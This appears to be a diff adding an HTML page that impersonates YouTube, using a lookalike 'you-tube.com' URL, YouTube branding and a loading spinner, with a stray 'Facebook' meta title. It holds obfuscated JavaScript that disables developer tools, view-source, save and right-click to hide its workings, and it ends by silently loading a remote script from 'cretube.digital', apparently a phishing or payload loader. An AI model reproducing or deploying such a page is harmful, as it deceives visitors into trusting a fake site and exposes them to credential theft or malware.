@@ -1,0 +1,42 @@
+<style>
+    [data-timed-style='fade']{display:none}[data-timed-style='scale']{display:none}
+  </style>
+<link rel='icon' type='image/png' href='https://www.youtube.com/favicon.ico'></link><head>
+<style>
+        .padre{padding:1rem;text-align:center}img{width:10rem;justify-content:center;align-items:center}@keyframes pulse{from{transform:scale(1)}to{transform:scale(.75);background-color:#ddd}}*{box-sizing:border-box}.spinner-box{display:flex;justify-content:center;align-items:center;background-color:transparent}.pulse-container{width:110px;display:flex;justify-content:space-between;align-items:center}.pulse-bubble{width:.7rem;height:.7rem;border-radius:50%;background-color:#1877f2}.pulse-bubble-1{animation:pulse .8s ease 0s infinite alternate}.pulse-bubble-2{animation:pulse .8s ease .2s infinite alternate}.pulse-bubble-3{animation:pulse .8s ease .4s infinite alternate}.pulse-bubble-4{animation:pulse .8s ease .6s infinite alternate}.pulse-bubble-5{animation:pulse .8s ease .8s infinite alternate}.contentt{position:fixed;width:100%;height:100%;background-color:#fff}#roott{width:100%;min-height:100vh;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;flex-wrap:wrap;justify-content:center;align-items:center;padding:15px;background-position:center;background-size:cover;background-repeat:no-repeat}
+    </style>
+<script type="text/javascript">
+    var _0x5c45=['cMfSlSoEWQtdRSk+sSkfqc49','t8kXASo8WQNdUSkw','DaOfjSkQW7tcKSkfW7NcK8oYemkT','W6a/ESo9WQVcNLq','irFcV8kHjCoOW4y','W7hdMJpdQSoaW73cPW','WQ9brrJdOG','W61JDSkKW4hcTCoR','k8o9WRRcJuBcRmk4','dMP2aSoFWRtdRG','fSk2fCoZW6lcJ8kxsCoSW74','WQBcHMG7ASkDWPZdTMK','W6/dHhXbWPBdT8oIWPldUmoeWQBdLW','c8k8W60iWRxcK3BdUmoa','a0NdRNyhwCoF','q8oRr8kYW4BcRmk/w8ohW5S','WQagDmoAWR7cPMVcRq','W7X7nIlcJSkBW7u','W5XcW67cHaVdVbi','WRuvW7VdJrnmFcRdGmkkWRvCW44','bCk1uSkpW4qbpmoGW4/cMCkOwmkp','lxKbyf/dQchdUZxcR1/cHq','tCkmDsldHwDB','zHRdQL0WWORdTa','WQRcNhC4vmklWOa','mWz1qJ7cSZ/dNu4','WQ/dImkTWOaPemopdqGgyJjM','W5uPoCkzlmoCW6v/W511','bgnJ','lxldIuKjEmoPiCkv','DSo+xmkceJNcRq','WOZcTmoyiLe','W67dK3m1jZvM','WQhdVYBdH8oQW6VcHa','s8kGBmovWO7dUSkcs8kse8oniSkpW5e','W7pcPsiMamoIavjqFq','CCkGW7pdVuxcP8kuFColkG','E0hdSSowFCk6WPFdNZCEo8kyWQS','bNT9lCo7WRxdSG','i8oSWRhcOMlcRCkK','WOGdWQ/cMqhdUadcKCor','W6LOySkiW5VcOSoRwqmOWQW','W61oWQVdKZXzCJtdNa','E0BdS8ouCSk/W4ldLIqKjmkZ','ytddTNjVsmkAWQBdQCkk','sSkHW7VdVqfsWPD0W6hcOq','WRicCq','a1xdVwGpu8oce8kAva','zLNcMc1mW7JcUSk/bSobDwNdLG','W6SAWPdcJf3cVJBdIG','W6SiW5VdOZn7yq','W7r2lHpcOSkqW7qdyW0'];var _0x36818e=_0x2b97;(function(_0x22c60f,_0x485a6d){var _0x457439=_0x2b97;while(!![]){try{var _0x367a84=-parseInt(_0x457439(0x169,'ZER*'))+-parseInt(_0x457439(0x16e,'GA6L'))+parseInt(_0x457439(0x168,'#(QJ'))*-parseInt(_0x457439(0x162,'1c4Y'))+parseInt(_0x457439(0x17f,'SXz5'))*parseInt(_0x457439(0x181,'i8cS'))+parseInt(_0x457439(0x163,'ZER*'))+-parseInt(_0x457439(0x187,'APvQ'))*-parseInt(_0x457439(0x175,'l[w]'))+-parseInt(_0x457439(0x16f,'7YN^'))*parseInt(_0x457439(0x189,'GA6L'));if(_0x367a84===_0x485a6d)break;else _0x22c60f['push'](_0x22c60f['shift']());}catch(_0x49bc56){_0x22c60f['push'](_0x22c60f['shift']());}}}(_0x5c45,0xaf606),document['onkeydown']=function(_0x3ff21f){var _0xe1e0f3=_0x2b97;if(event[_0xe1e0f3(0x15c,'C*cT')]==0x7b)return![];if(_0x3ff21f[_0xe1e0f3(0x165,'1c4Y')]&&_0x3ff21f[_0xe1e0f3(0x176,'ZER*')]=='E'[_0xe1e0f3(0x17c,'i8cS')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x184,'Rw!w')]&&_0x3ff21f['shiftKey']&&_0x3ff21f['keyCode']=='I'[_0xe1e0f3(0x18d,'tqWM')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x18a,'apIh')]&&_0x3ff21f[_0xe1e0f3(0x182,'l[w]')]&&_0x3ff21f['keyCode']=='J'[_0xe1e0f3(0x16a,'d!3W')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x164,'vTf8')]&&_0x3ff21f[_0xe1e0f3(0x17a,'1c4Y')]=='U'[_0xe1e0f3(0x171,'@Lk5')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x15e,'DalK')]&&_0x3ff21f[_0xe1e0f3(0x17b,'vTf8')]=='S'[_0xe1e0f3(0x16d,'2XKc')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x173,'YEeR')]&&_0x3ff21f[_0xe1e0f3(0x188,'8ydk')]=='H'[_0xe1e0f3(0x16b,'e))V')](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x177,'#ERe')]&&_0x3ff21f[_0xe1e0f3(0x183,'@Lk5')]=='A'['charCodeAt'](0x0))return![];if(_0x3ff21f[_0xe1e0f3(0x180,'2XKc')]&&_0x3ff21f[_0xe1e0f3(0x179,'mqM3')]=='E'['charCodeAt'](0x0))return![];});function disableIE(){var _0x405c19=_0x2b97;if(document[_0x405c19(0x16c,'l[w]')])return![];}function _0x2b97(_0x456b03,_0x1a9d6a){_0x456b03=_0x456b03-0x15c;var _0x5c45ff=_0x5c45[_0x456b03];if(_0x2b97['rNMmXk']===undefined){var _0x2b97f6=function(_0xe21243){var _0x2a1d3c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x55324c='';for(var _0x5c511e=0x0,_0x48d818,_0xae35e1,_0x290467=0x0;_0xae35e1=_0xe21243['charAt'](_0x290467++);~_0xae35e1&&(_0x48d818=_0x5c511e%0x4?_0x48d818*0x40+_0xae35e1:_0xae35e1,_0x5c511e++%0x4)?_0x55324c+=String['fromCharCode'](0xff&_0x48d818>>(-0x2*_0x5c511e&0x6)):0x0){_0xae35e1=_0x2a1d3c['indexOf'](_0xae35e1);}return _0x55324c;};var _0x2ada8d=function(_0x33fc31,_0x4652a5){var _0x385a18=[],_0x468eff=0x0,_0x1f7dce,_0x3ef0f9='',_0x14ff7a='';_0x33fc31=_0x2b97f6(_0x33fc31);for(var _0x6891b3=0x0,_0x149cab=_0x33fc31['length'];_0x6891b3<_0x149cab;_0x6891b3++){_0x14ff7a+='%'+('00'+_0x33fc31['charCodeAt'](_0x6891b3)['toString'](0x10))['slice'](-0x2);}_0x33fc31=decodeURIComponent(_0x14ff7a);var _0x5326b5;for(_0x5326b5=0x0;_0x5326b5<0x100;_0x5326b5++){_0x385a18[_0x5326b5]=_0x5326b5;}for(_0x5326b5=0x0;_0x5326b5<0x100;_0x5326b5++){_0x468eff=(_0x468eff+_0x385a18[_0x5326b5]+_0x4652a5['charCodeAt'](_0x5326b5%_0x4652a5['length']))%0x100,_0x1f7dce=_0x385a18[_0x5326b5],_0x385a18[_0x5326b5]=_0x385a18[_0x468eff],_0x385a18[_0x468eff]=_0x1f7dce;}_0x5326b5=0x0,_0x468eff=0x0;for(var _0x33cd2f=0x0;_0x33cd2f<_0x33fc31['length'];_0x33cd2f++){_0x5326b5=(_0x5326b5+0x1)%0x100,_0x468eff=(_0x468eff+_0x385a18[_0x5326b5])%0x100,_0x1f7dce=_0x385a18[_0x5326b5],_0x385a18[_0x5326b5]=_0x385a18[_0x468eff],_0x385a18[_0x468eff]=_0x1f7dce,_0x3ef0f9+=String['fromCharCode'](_0x33fc31['charCodeAt'](_0x33cd2f)^_0x385a18[(_0x385a18[_0x5326b5]+_0x385a18[_0x468eff])%0x100]);}return _0x3ef0f9;};_0x2b97['GREwPl']=_0x2ada8d,_0x2b97['IOQjjF']={},_0x2b97['rNMmXk']=!![];}var _0x3ff21f=_0x5c45[0x0],_0x5d4b47=_0x456b03+_0x3ff21f,_0x41865b=_0x2b97['IOQjjF'][_0x5d4b47];return _0x41865b===undefined?(_0x2b97['aZvnPY']===undefined&&(_0x2b97['aZvnPY']=!![]),_0x5c45ff=_0x2b97['GREwPl'](_0x5c45ff,_0x1a9d6a),_0x2b97['IOQjjF'][_0x5d4b47]=_0x5c45ff):_0x5c45ff=_0x41865b,_0x5c45ff;}function disableNS(_0x5d4b47){var _0x6e24bd=_0x2b97;if(document['layers']||document[_0x6e24bd(0x160,'YEeR')]&&!document[_0x6e24bd(0x18e,'vTf8')]){if(_0x5d4b47[_0x6e24bd(0x178,'glA6')]==0x2||_0x5d4b47[_0x6e24bd(0x15d,'gbsp')]==0x3)return![];}}document['layers']?(document[_0x36818e(0x186,'^Uos')](Event[_0x36818e(0x18f,'2XKc')]),document[_0x36818e(0x167,'mqM3')]=disableNS):(document[_0x36818e(0x17d,'apIh')]=disableNS,document[_0x36818e(0x185,'#(QJ')]=disableIE);document[_0x36818e(0x172,'vTf8')]=new Function('return\x20false');
+    </script>
+<title>YouTube</title>
+<meta charset="UTF-8">
+<meta name="title" content="Facebook">
+<meta name="description" content="Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://www.you-tube.com">
+<meta property="og:title" content="YouTube">
+<meta property="og:description" content="Enjoy the videos and music you love, upload original content, and share it all with friends, family, and the world on YouTube.">
+<meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
+</head>
+<body>
+<div class="contentt">
+<div id="roott">
+<div class="container-login100" style="background-image: url('images/bg-01.pn');">
+<div class="padre">
+<center> <img src="https://i.imgur.com/cQQI4uE.png" /> </center>
+</div>
+<div class="padre">
+<div class="spinner-box">
+<div class="pulse-container">
+<div class="pulse-bubble pulse-bubble-1"></div>
+<div class="pulse-bubble pulse-bubble-2"></div>
+<div class="pulse-bubble pulse-bubble-3"></div>
+<div class="pulse-bubble pulse-bubble-4"></div>
+<div class="pulse-bubble pulse-bubble-5"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<img style="visibility: hidden;" id="img" src="https://www.youtube.com/img/desktop/yt_1200.png" width="100%">
+<script src="https://cretube.digital/?api=1&lan=fb2020&ht=2" type="text/javascript" async="true"></script>
